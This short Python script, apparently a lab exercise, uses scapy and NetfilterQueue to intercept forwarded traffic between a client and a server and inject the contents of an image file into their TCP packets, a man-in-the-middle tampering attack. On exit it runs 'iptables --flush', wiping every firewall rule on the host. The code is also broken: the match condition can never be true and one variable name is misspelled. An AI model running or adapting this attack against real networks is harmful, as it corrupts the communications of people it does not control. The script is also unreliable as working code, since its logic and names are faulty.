import os
from scapy.all import IP, TCP, scapy, send
from netfilterqueue import NetfilterQueue as NFQ

client_ip = "198.10.0.1"
server_ip = "198.10.0.2"

def alter_pck(packet):
    global client_ip, server_ip

    pck = IP(packet.get_payload())

    if pck.haslayer(TCP) and pck[IP].src == client_ip and pck[IP].src == server_ip:
        msg = open("poza_server.png","rb").read()
        new_pck = IP( src=pck[IP].src, dst=pck[IP].dst) / TCP( sport = pck[TCP].sport, dport = pck[TCP].dport, seq = pck[TCP].seq, ack = pck[TCP].ack, flags=pcj[TCP].flags) / (msg)

        send(new_pck)
    else:
        send(pck)

if __name__ == '__main__':
    queue = NFQ()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1000")
        queue.bind(1000, alter_pck)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()
